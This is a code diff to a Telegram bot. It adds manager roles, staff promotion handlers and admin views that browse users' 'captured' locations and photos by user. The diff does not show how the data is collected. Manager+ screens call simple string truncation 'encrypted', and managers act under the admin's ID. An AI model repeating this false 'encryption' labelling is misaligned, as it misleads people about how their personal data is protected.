@@ -12,13 +12,18 @@ const api = require('./api');
 const { 
     mainMenuKeyboard,
     adminMenuKeyboard,
+    managerMenuKeyboard,
     previewMenuKeyboard,
     getPermissionTypeFromButton, 
     sessionActionsKeyboard,
     adminPanelKeyboard,
+    managerPanelKeyboard,
+    managerPlusPanelKeyboard,
     accessRequestsKeyboard,
     userListKeyboard,
-    userDetailKeyboard
+    userDetailKeyboard,
+    staffListKeyboard,
+    staffDetailKeyboard
 } = require('./keyboard');
 
 // Create bot instance
@@ -39,6 +44,38 @@ const isAdmin = (telegramId) => {
 };
 
 /**
+ * Get user role from API
+ */
+const getUserRole = async (telegramId) => {
+    try {
+        const result = await api.getUserRole(telegramId);
+        return result;
+    } catch (error) {
+        logger.error('Failed to get user role', { error: error.message });
+        return { role: 'user', isAdmin: false, isManager: false, isManagerPlus: false };
+    }
+};
+
+/**
+ * Encrypt/mask data for manager+ view
+ */
+const maskData = (data, type) => {
+    if (type === 'location') {
+        // Show partial coordinates
+        const lat = data.latitude ? `${String(data.latitude).substring(0, 5)}***` : 'N/A';
+        const lon = data.longitude ? `${String(data.longitude).substring(0, 5)}***` : 'N/A';
+        return `📍 ${lat}, ${lon}`;
+    }
+    if (type === 'address') {
+        // Show partial address
+        if (!data) return '***';
+        const parts = data.split(',');
+        return parts[0] + ', ***';
+    }
+    return '***encrypted***';
+};
+
+/**
  * Get appropriate menu for user
  */
 const getMenuForUser = async (telegramId) => {
@@ -47,6 +84,12 @@ const getMenuForUser = async (telegramId) => {
     }
     
     try {
+        // Check role first
+        const roleInfo = await getUserRole(telegramId);
+        if (roleInfo.isManager) {
+            return managerMenuKeyboard;
+        }
+        
         const result = await api.checkUserStatus(telegramId);
         if (result.success && result.status.isApproved) {
             return mainMenuKeyboard;
@@ -219,6 +262,27 @@ bot.on('text', async (ctx) => {
             '🔐 *Admin Panel*\n\n' +
             'Select an option below:',
             { parse_mode: 'Markdown', ...adminPanelKeyboard }
+        );
+        return;
+    }
+    
+    // Handle Manager Panel button
+    if (buttonText === '👔 Manager Panel') {
+        const roleInfo = await getUserRole(user.id);
+        
+        if (!roleInfo.isManager) {
+            await ctx.reply('❌ Manager access required.');
+            return;
+        }
+        
+        // Show appropriate panel based on role
+        const panel = roleInfo.isManagerPlus ? managerPlusPanelKeyboard : managerPanelKeyboard;
+        const roleName = roleInfo.isManagerPlus ? 'Manager+' : 'Manager';
+        
+        await ctx.reply(
+            `👔 *${roleName} Panel*\n\n` +
+            'Select an option below:',
+            { parse_mode: 'Markdown', ...panel }
         );
         return;
     }
@@ -1093,18 +1157,96 @@ bot.action('admin_all_locations', async (ctx) => {
         return;
     }
     
-    await ctx.answerCbQuery('Loading all locations...');
+    await ctx.answerCbQuery();
     
     try {
         const result = await api.getAllMedia('location');
         
         if (!result.success || !result.data || result.data.length === 0) {
-            await ctx.reply('📍 No locations captured yet.');
+            await ctx.editMessageText('📍 No locations captured yet.', {
+                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_panel')]])
+            });
             return;
         }
         
-        const locations = result.data;
-        await ctx.reply(`📍 *ALL LOCATIONS (${locations.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        // Group by user
+        const userMap = new Map();
+        for (const loc of result.data) {
+            const id = loc.telegram_id || 'unknown';
+            if (!userMap.has(id)) {
+                userMap.set(id, { 
+                    username: loc.username || loc.first_name || 'Unknown',
+                    count: 0 
+                });
+            }
+            userMap.get(id).count++;
+        }
+        
+        let msg = `📍 *All Locations* (${result.data.length})\n\n`;
+        msg += `Select a user to view their locations:\n\n`;
+        
+        const buttons = [];
+        buttons.push([Markup.button.callback(`📍 View All (${result.data.length})`, 'admin_loc_all')]);
+        
+        for (const [telegramId, info] of userMap) {
+            buttons.push([Markup.button.callback(
+                `👤 ${info.username} (${info.count})`,
+                `admin_loc_user_${telegramId}`
+            )]);
+        }
+        buttons.push([Markup.button.callback('« Back', 'admin_panel')]);
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard(buttons.slice(0, 10))
+        });
+        
+    } catch (error) {
+        logger.error('Failed to load locations', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
+});
+
+/**
+ * View all locations (no filter)
+ */
+bot.action('admin_loc_all', async (ctx) => {
+    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
+    await ctx.answerCbQuery('Loading all locations...');
+    await showLocations(ctx, null);
+});
+
+/**
+ * View locations for specific user
+ */
+bot.action(/^admin_loc_user_(\d+)$/, async (ctx) => {
+    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
+    const userId = ctx.match[1];
+    await ctx.answerCbQuery('Loading user locations...');
+    await showLocations(ctx, userId);
+});
+
+/**
+ * Helper function to show locations
+ */
+async function showLocations(ctx, filterUserId) {
+    try {
+        const result = await api.getAllMedia('location');
+        let locations = result.data || [];
+        
+        if (filterUserId) {
+            locations = locations.filter(l => String(l.telegram_id) === String(filterUserId));
+        }
+        
+        if (locations.length === 0) {
+            await ctx.reply('📍 No locations found.');
+            return;
+        }
+        
+        const title = filterUserId 
+            ? `📍 *Locations for User ${filterUserId}* (${locations.length})`
+            : `📍 *ALL LOCATIONS* (${locations.length})`;
+        await ctx.reply(`${title}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
         
         for (let i = 0; i < Math.min(locations.length, 20); i++) {
             const loc = locations[i];
@@ -1128,10 +1270,10 @@ bot.action('admin_all_locations', async (ctx) => {
         }
         
     } catch (error) {
-        logger.error('Failed to load all locations', { error: error.message });
+        logger.error('Failed to load locations', { error: error.message });
         await ctx.reply('❌ Error: ' + error.message);
     }
-});
+}
 
 /**
  * Handle admin view all photos
@@ -1142,21 +1284,99 @@ bot.action('admin_all_photos', async (ctx) => {
         return;
     }
     
-    await ctx.answerCbQuery('Loading all photos...');
+    await ctx.answerCbQuery();
     
     try {
         const result = await api.getAllMedia('photo');
         
         if (!result.success || !result.data || result.data.length === 0) {
-            await ctx.reply('📷 No photos captured yet.');
+            await ctx.editMessageText('📷 No photos captured yet.', {
+                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_panel')]])
+            });
             return;
         }
         
-        const photos = result.data;
-        await ctx.reply(`📷 *ALL PHOTOS (${photos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        // Group by user
+        const userMap = new Map();
+        for (const photo of result.data) {
+            const id = photo.telegram_id || 'unknown';
+            if (!userMap.has(id)) {
+                userMap.set(id, { 
+                    username: photo.username || photo.first_name || 'Unknown',
+                    count: 0 
+                });
+            }
+            userMap.get(id).count++;
+        }
         
-        const fs = require('fs');
-        const path = require('path');
+        let msg = `📷 *All Photos* (${result.data.length})\n\n`;
+        msg += `Select a user to view their photos:\n\n`;
+        
+        const buttons = [];
+        buttons.push([Markup.button.callback(`📷 View All (${result.data.length})`, 'admin_photo_all')]);
+        
+        for (const [telegramId, info] of userMap) {
+            buttons.push([Markup.button.callback(
+                `👤 ${info.username} (${info.count})`,
+                `admin_photo_user_${telegramId}`
+            )]);
+        }
+        buttons.push([Markup.button.callback('« Back', 'admin_panel')]);
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard(buttons.slice(0, 10))
+        });
+        
+    } catch (error) {
+        logger.error('Failed to load photos', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
+});
+
+/**
+ * View all photos (no filter)
+ */
+bot.action('admin_photo_all', async (ctx) => {
+    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
+    await ctx.answerCbQuery('Loading all photos...');
+    await showPhotos(ctx, null);
+});
+
+/**
+ * View photos for specific user
+ */
+bot.action(/^admin_photo_user_(\d+)$/, async (ctx) => {
+    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
+    const userId = ctx.match[1];
+    await ctx.answerCbQuery('Loading user photos...');
+    await showPhotos(ctx, userId);
+});
+
+/**
+ * Helper function to show photos
+ */
+async function showPhotos(ctx, filterUserId) {
+    const fs = require('fs');
+    const path = require('path');
+    
+    try {
+        const result = await api.getAllMedia('photo');
+        let photos = result.data || [];
+        
+        if (filterUserId) {
+            photos = photos.filter(p => String(p.telegram_id) === String(filterUserId));
+        }
+        
+        if (photos.length === 0) {
+            await ctx.reply('📷 No photos found.');
+            return;
+        }
+        
+        const title = filterUserId 
+            ? `📷 *Photos for User ${filterUserId}* (${photos.length})`
+            : `📷 *ALL PHOTOS* (${photos.length})`;
+        await ctx.reply(`${title}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
         
         for (let i = 0; i < Math.min(photos.length, 10); i++) {
             const photo = photos[i];
@@ -1185,10 +1405,10 @@ bot.action('admin_all_photos', async (ctx) => {
         }
         
     } catch (error) {
-        logger.error('Failed to load all photos', { error: error.message });
+        logger.error('Failed to load photos', { error: error.message });
         await ctx.reply('❌ Error: ' + error.message);
     }
-});
+}
 
 /**
  * Handle admin view all videos
@@ -1776,6 +1996,697 @@ bot.action(/^deny_(\d+)$/, async (ctx) => {
         logger.error('Failed to deny user', { error: error.message });
         await ctx.reply('❌ Failed to deny user: ' + error.message);
     }
+});
+
+// ============================================
+// Staff Management Handlers
+// ============================================
+
+/**
+ * Handle manage staff button
+ */
+bot.action('admin_staff', async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.getStaffList(user.id);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to get staff');
+        }
+        
+        if (result.count === 0) {
+            await ctx.editMessageText(
+                '👥 *Staff Management*\n\n' +
+                '📭 No staff members yet.\n\n' +
+                '_To add staff, first approve a user, then use the "Add Staff" button below._',
+                { 
+                    parse_mode: 'Markdown',
+                    ...Markup.inlineKeyboard([
+                        [Markup.button.callback('➕ Add Staff Member', 'staff_add')],
+                        [Markup.button.callback('« Back', 'admin_panel')]
+                    ])
+                }
+            );
+            return;
+        }
+        
+        let msg = `👥 *Staff Management* (${result.count})\n\n`;
+        result.staff.forEach((s, i) => {
+            const roleEmoji = s.role === 'manager_plus' ? '⭐' : '👔';
+            const roleName = s.role === 'manager_plus' ? 'Manager+' : 'Manager';
+            msg += `${i + 1}. ${roleEmoji} ${s.firstName || 'Unknown'} ${s.lastName || ''}\n`;
+            msg += `   @${s.username || 'N/A'} | ${roleName}\n\n`;
+        });
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...staffListKeyboard(result.staff)
+        });
+        
+    } catch (error) {
+        logger.error('Failed to get staff list', { error: error.message });
+        await ctx.reply('❌ Failed to load staff: ' + error.message);
+    }
+});
+
+/**
+ * Handle add staff - show list of approved users
+ */
+bot.action('staff_add', async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.getAllUsers(user.id);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to get users');
+        }
+        
+        // Filter approved users who are not already staff
+        const availableUsers = result.users.filter(u => 
+            u.isApproved && 
+            !['admin', 'manager', 'manager_plus'].includes(u.role) &&
+            u.telegramId !== config.admin.telegramId
+        );
+        
+        if (availableUsers.length === 0) {
+            await ctx.editMessageText(
+                '➕ *Add Staff Member*\n\n' +
+                '📭 No approved users available to promote.\n\n' +
+                '_Approve users first before adding them as staff._',
+                { 
+                    parse_mode: 'Markdown',
+                    ...Markup.inlineKeyboard([
+                        [Markup.button.callback('« Back', 'admin_staff')]
+                    ])
+                }
+            );
+            return;
+        }
+        
+        let msg = '➕ *Add Staff Member*\n\n_Select a user to promote:_\n\n';
+        
+        const buttons = availableUsers.slice(0, 10).map(u => [
+            Markup.button.callback(
+                `${u.firstName || 'Unknown'} (@${u.username || u.telegramId})`,
+                `staff_select_${u.telegramId}`
+            )
+        ]);
+        buttons.push([Markup.button.callback('« Back', 'admin_staff')]);
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard(buttons)
+        });
+        
+    } catch (error) {
+        logger.error('Failed to get users for staff add', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Handle staff selection for promotion - show role options
+ */
+bot.action(/^staff_select_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    await ctx.editMessageText(
+        '👔 *Select Role*\n\n' +
+        'Choose a role for this user:\n\n' +
+        '👔 *Manager* - Can approve/decline access requests\n\n' +
+        '⭐ *Manager+* - Manager + can view user data (encrypted)',
+        {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('👔 Manager', `staff_promote_manager_${targetId}`)],
+                [Markup.button.callback('⭐ Manager+', `staff_promote_manager_plus_${targetId}`)],
+                [Markup.button.callback('« Back', 'staff_add')]
+            ])
+        }
+    );
+});
+
+/**
+ * Handle staff promotion
+ */
+bot.action(/^staff_promote_(manager|manager_plus)_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const role = ctx.match[1];
+    const targetId = ctx.match[2];
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.addStaff(targetId, role, user.id);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to promote user');
+        }
+        
+        const roleName = role === 'manager_plus' ? 'Manager+' : 'Manager';
+        
+        await ctx.editMessageText(
+            `✅ *User Promoted!*\n\n` +
+            `${result.staff.firstName || 'User'} is now a ${roleName}.`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('👥 View Staff', 'admin_staff')],
+                    [Markup.button.callback('« Back to Panel', 'admin_panel')]
+                ])
+            }
+        );
+        
+        // Notify the promoted user
+        try {
+            await bot.telegram.sendMessage(
+                targetId,
+                `🎉 *Congratulations!*\n\n` +
+                `You have been promoted to *${roleName}*!\n\n` +
+                `Your new menu is available now.`,
+                { parse_mode: 'Markdown', ...managerMenuKeyboard }
+            );
+        } catch (e) {
+            logger.warn('Could not notify promoted user', { targetId });
+        }
+        
+    } catch (error) {
+        logger.error('Failed to promote user', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Handle view staff member
+ */
+bot.action(/^staffview_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    try {
+        const staffList = await api.getStaffList(user.id);
+        const staff = staffList.staff.find(s => String(s.telegramId) === targetId);
+        
+        if (!staff) {
+            await ctx.editMessageText('❌ Staff member not found.', {
+                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_staff')]])
+            });
+            return;
+        }
+        
+        const roleName = staff.role === 'manager_plus' ? 'Manager+' : 'Manager';
+        const roleEmoji = staff.role === 'manager_plus' ? '⭐' : '👔';
+        
+        let msg = `${roleEmoji} *Staff Member*\n\n`;
+        msg += `👤 Name: ${staff.firstName || 'Unknown'} ${staff.lastName || ''}\n`;
+        msg += `📧 Username: @${staff.username || 'N/A'}\n`;
+        msg += `🆔 ID: \`${staff.telegramId}\`\n`;
+        msg += `👔 Role: ${roleName}\n`;
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...staffDetailKeyboard(staff.telegramId, staff.role)
+        });
+        
+    } catch (error) {
+        logger.error('Failed to view staff', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Handle promote staff to manager+
+ */
+bot.action(/^promote_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.updateStaffRole(targetId, 'manager_plus', user.id);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to promote');
+        }
+        
+        await ctx.editMessageText(
+            `✅ User promoted to Manager+!`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('« Back to Staff', 'admin_staff')]
+                ])
+            }
+        );
+        
+        // Notify user
+        try {
+            await bot.telegram.sendMessage(
+                targetId,
+                `🎉 You have been promoted to *Manager+*!`,
+                { parse_mode: 'Markdown' }
+            );
+        } catch (e) {}
+        
+    } catch (error) {
+        logger.error('Failed to promote', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Handle demote staff to manager
+ */
+bot.action(/^demote_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.updateStaffRole(targetId, 'manager', user.id);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to demote');
+        }
+        
+        await ctx.editMessageText(
+            `✅ User demoted to Manager.`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('« Back to Staff', 'admin_staff')]
+                ])
+            }
+        );
+        
+        // Notify user
+        try {
+            await bot.telegram.sendMessage(
+                targetId,
+                `ℹ️ Your role has been changed to *Manager*.`,
+                { parse_mode: 'Markdown' }
+            );
+        } catch (e) {}
+        
+    } catch (error) {
+        logger.error('Failed to demote', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Handle remove staff
+ */
+bot.action(/^removestaff_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.removeStaff(targetId, user.id);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to remove');
+        }
+        
+        await ctx.editMessageText(
+            `✅ Staff member removed.`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('« Back to Staff', 'admin_staff')]
+                ])
+            }
+        );
+        
+        // Notify user
+        try {
+            await bot.telegram.sendMessage(
+                targetId,
+                `ℹ️ Your staff role has been removed. You are now a regular user.`,
+                { parse_mode: 'Markdown', ...mainMenuKeyboard }
+            );
+        } catch (e) {}
+        
+    } catch (error) {
+        logger.error('Failed to remove staff', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+// ============================================
+// Manager Panel Handlers
+// ============================================
+
+/**
+ * Manager - View pending requests
+ */
+bot.action('mgr_requests', async (ctx) => {
+    const user = ctx.from;
+    const roleInfo = await getUserRole(user.id);
+    
+    if (!roleInfo.isManager) {
+        await ctx.answerCbQuery('❌ Manager access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery();
+    
+    try {
+        // Managers can also view pending requests
+        const result = await api.getPendingRequests(config.admin.telegramId);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to get requests');
+        }
+        
+        if (result.count === 0) {
+            const panel = roleInfo.isManagerPlus ? managerPlusPanelKeyboard : managerPanelKeyboard;
+            await ctx.editMessageText(
+                '📋 *Access Requests*\n\n' +
+                '✅ No pending requests!',
+                { parse_mode: 'Markdown', ...panel }
+            );
+            return;
+        }
+        
+        let msg = `📋 *Access Requests* (${result.count})\n\n`;
+        result.requests.forEach((req, i) => {
+            msg += `${i + 1}. ${req.firstName || 'Unknown'} ${req.lastName || ''}\n`;
+            msg += `   @${req.username || 'N/A'} | ID: \`${req.telegramId}\`\n\n`;
+        });
+        msg += `\n_Tap ✅ to approve or ❌ to deny_`;
+        
+        // Create manager-specific keyboard
+        const buttons = [];
+        result.requests.forEach(req => {
+            buttons.push([
+                Markup.button.callback(`✅ Approve ${req.firstName || req.telegramId}`, `mgr_approve_${req.telegramId}`),
+                Markup.button.callback(`❌ Deny`, `mgr_deny_${req.telegramId}`)
+            ]);
+        });
+        buttons.push([Markup.button.callback('« Back', 'mgr_back')]);
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard(buttons)
+        });
+        
+    } catch (error) {
+        logger.error('Manager failed to get requests', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Manager approve user
+ */
+bot.action(/^mgr_approve_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    const roleInfo = await getUserRole(user.id);
+    
+    if (!roleInfo.isManager) {
+        await ctx.answerCbQuery('❌ Manager access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    try {
+        // Use admin ID for API (managers act on behalf of admin for now)
+        const result = await api.approveUser(targetId, config.admin.telegramId);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to approve');
+        }
+        
+        await ctx.editMessageText(
+            `✅ *User Approved!*\n\n` +
+            `${result.user.firstName || 'User'} has been approved.`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('📋 More Requests', 'mgr_requests')],
+                    [Markup.button.callback('« Back', 'mgr_back')]
+                ])
+            }
+        );
+        
+        // Notify the approved user
+        try {
+            await bot.telegram.sendMessage(
+                targetId,
+                `🎉 *Access Granted!*\n\n` +
+                `Your access request has been approved!\n\n` +
+                `You now have access to all features.`,
+                { parse_mode: 'Markdown', ...mainMenuKeyboard }
+            );
+        } catch (e) {
+            logger.warn('Could not notify approved user', { targetId });
+        }
+        
+        logger.info('Manager approved user', { managerId: user.id, targetId });
+        
+    } catch (error) {
+        logger.error('Manager failed to approve', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Manager deny user
+ */
+bot.action(/^mgr_deny_(\d+)$/, async (ctx) => {
+    const user = ctx.from;
+    const roleInfo = await getUserRole(user.id);
+    
+    if (!roleInfo.isManager) {
+        await ctx.answerCbQuery('❌ Manager access required');
+        return;
+    }
+    
+    const targetId = ctx.match[1];
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.denyUser(targetId, config.admin.telegramId);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to deny');
+        }
+        
+        await ctx.editMessageText(
+            `❌ *User Denied*\n\n` +
+            `The access request has been denied.`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('📋 More Requests', 'mgr_requests')],
+                    [Markup.button.callback('« Back', 'mgr_back')]
+                ])
+            }
+        );
+        
+        // Notify the denied user
+        try {
+            await bot.telegram.sendMessage(
+                targetId,
+                `❌ *Access Denied*\n\n` +
+                `Your access request has been denied.`,
+                { parse_mode: 'Markdown' }
+            );
+        } catch (e) {}
+        
+        logger.info('Manager denied user', { managerId: user.id, targetId });
+        
+    } catch (error) {
+        logger.error('Manager failed to deny', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Manager+ view all users (encrypted data)
+ */
+bot.action('mgr_users', async (ctx) => {
+    const user = ctx.from;
+    const roleInfo = await getUserRole(user.id);
+    
+    if (!roleInfo.isManagerPlus) {
+        await ctx.answerCbQuery('❌ Manager+ access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery();
+    
+    try {
+        const result = await api.getAllUsers(config.admin.telegramId);
+        
+        if (!result.success) {
+            throw new Error(result.error || 'Failed to get users');
+        }
+        
+        if (result.count === 0) {
+            await ctx.editMessageText(
+                '👥 *Users* (Encrypted View)\n\n📭 No users yet.',
+                { parse_mode: 'Markdown', ...managerPlusPanelKeyboard }
+            );
+            return;
+        }
+        
+        let msg = `👥 *Users* (${result.count}) - _Encrypted View_\n\n`;
+        result.users.slice(0, 10).forEach((u, i) => {
+            // Encrypt/mask user data for manager+
+            const maskedId = String(u.telegramId).substring(0, 4) + '***';
+            const maskedName = (u.firstName || 'U').substring(0, 2) + '***';
+            msg += `${i + 1}. ${maskedName} | ID: ${maskedId}\n`;
+            msg += `   📊 ${u.sessionCount || 0} sessions, ${u.mediaCount || 0} media\n\n`;
+        });
+        
+        if (result.count > 10) {
+            msg += `\n_...and ${result.count - 10} more users_`;
+        }
+        
+        msg += `\n\n🔒 _Data encrypted for security_`;
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('« Back', 'mgr_back')]
+            ])
+        });
+        
+    } catch (error) {
+        logger.error('Manager+ failed to get users', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Manager+ view locations (encrypted)
+ */
+bot.action('mgr_all_locations', async (ctx) => {
+    const user = ctx.from;
+    const roleInfo = await getUserRole(user.id);
+    
+    if (!roleInfo.isManagerPlus) {
+        await ctx.answerCbQuery('❌ Manager+ access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery();
+    await ctx.sendChatAction('typing');
+    
+    try {
+        const result = await api.getAllMedia('location');
+        
+        if (!result.success || result.data.length === 0) {
+            await ctx.reply('📭 No locations captured yet.');
+            return;
+        }
+        
+        let msg = `📍 *All Locations* (${result.data.length}) - _Encrypted View_\n\n`;
+        
+        result.data.slice(0, 10).forEach((loc, i) => {
+            const meta = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
+            // Mask location data
+            const maskedLat = meta?.latitude ? String(meta.latitude).substring(0, 5) + '***' : 'N/A';
+            const maskedLon = meta?.longitude ? String(meta.longitude).substring(0, 5) + '***' : 'N/A';
+            const maskedUser = (loc.first_name || 'U').substring(0, 2) + '***';
+            
+            msg += `${i + 1}. 👤 ${maskedUser}\n`;
+            msg += `   📍 ${maskedLat}, ${maskedLon}\n`;
+            msg += `   🕐 ${new Date(loc.created_at).toLocaleDateString()}\n\n`;
+        });
+        
+        msg += `\n🔒 _Coordinates partially hidden for security_`;
+        
+        await ctx.reply(msg, { 
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('« Back', 'mgr_back')]
+            ])
+        });
+        
+    } catch (error) {
+        logger.error('Manager+ failed to get locations', { error: error.message });
+        await ctx.reply('❌ Failed: ' + error.message);
+    }
+});
+
+/**
+ * Manager back button
+ */
+bot.action('mgr_back', async (ctx) => {
+    const user = ctx.from;
+    const roleInfo = await getUserRole(user.id);
+    
+    await ctx.answerCbQuery();
+    await ctx.deleteMessage().catch(() => {});
+    
+    const panel = roleInfo.isManagerPlus ? managerPlusPanelKeyboard : managerPanelKeyboard;
+    const roleName = roleInfo.isManagerPlus ? 'Manager+' : 'Manager';
+    
+    await ctx.reply(
+        `👔 *${roleName} Panel*\n\n` +
+        'Select an option below:',
+        { parse_mode: 'Markdown', ...panel }
+    );
 });
 
 /**
